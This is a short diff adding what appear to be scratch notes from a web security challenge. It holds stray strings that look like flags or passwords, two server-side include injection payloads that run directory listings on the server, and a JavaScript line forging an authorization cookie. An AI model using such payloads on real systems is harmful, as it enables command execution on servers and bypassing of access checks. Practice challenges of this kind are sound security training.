@@ -1,0 +1,14 @@
+dee007
+dfg34<
+
+3f3h:fj>
+
+
+SSI Injection
+<!--#exec cmd="ls ../"-->
+0372a340
+<!--#exec cmd="ls ../../9"-->
+6834dcfc
+
+
+document.cookie="level10_authorized=yes";
